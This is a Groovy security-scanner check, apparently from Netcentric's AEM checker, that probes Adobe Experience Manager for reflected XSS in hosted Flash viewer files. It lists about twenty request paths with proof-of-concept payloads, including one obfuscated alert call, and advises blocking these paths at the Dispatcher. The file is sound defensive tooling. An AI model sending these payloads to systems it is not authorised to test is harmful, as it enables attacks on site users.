/*
 * (C) Copyright 2020 Netcentric - a Cognizant Digital Business
 *
 * All rights reserved. This program and the accompanying materials
 * are made available under the terms of the Eclipse Public License v1.0
 * which accompanies this distribution, and is available at
 * http://www.eclipse.org/legal/epl-v10.html
 */
import biz.netcentric.security.checkerdsl.dsl.securitycheck.HttpSecurityCheck
import biz.netcentric.security.checkerdsl.model.Severity

/**
 * AEM provides a number of based SWF tools such as viewers that might be vulnerable.
 * See - https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61
 */
HttpSecurityCheck.create{

    id "nc-xgqEM4gH"

    name "Reflected XSS vulnerabilities in AEM hosted SWFs"

    vulnerability {
        name "XSS: ${name}"
        description '''AEM provides a number of based SWF tools such as viewers that might be vulnerable.'''
        remediation "AEM's Dispatcher must be configured to block the respective paths, to prevent them from beeing delivered."
        cve "CWE-749"
        severity Severity.HIGH
    }

    categories 'xss', 'dispatcher'

    steps([
            {

                name "GET to known flashplayer instances hosted in AEM and accessible to the outside world"

                paths {
                    ["/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm(document.domain)",
                     "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm`document.domain`",
                     "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf.res?onclick=javascript:confirm(document.domain)",
                     "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf.res?onclick=javascript:confirm`document.domain`",
                     "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf?contentPath=%5c\"))%7dcatch(e)%7balert(document.domain)%7d//",
                     "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf.res?contentPath=%5c\"))%7dcatch(e)%7balert(document.domain)%7d//",
                     "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf?javascriptCallbackFunction=alert(document.domain)-String",
                     "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf?javascriptCallbackFunction=alertdocument.domain`-String",
                     "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf.res?javascriptCallbackFunction=alert(document.domain)-String",
                     "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf?swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
                     "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf.res?swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
                     "/libs/cq/ui/resources/swfupload/swfupload.swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
                     "/libs/cq/ui/resources/swfupload/swfupload.swf.res?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
                     "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=alert(document.domain)-window",
                     "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix=alert(document.domain)-window",
                     "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//",
                     "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf.res?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//",
                     "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window",
                     "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window"]
                }

                method "GET"
                detect {
                    all {
                        checkStatusCode 200
                    }
                }
            }
    ])
}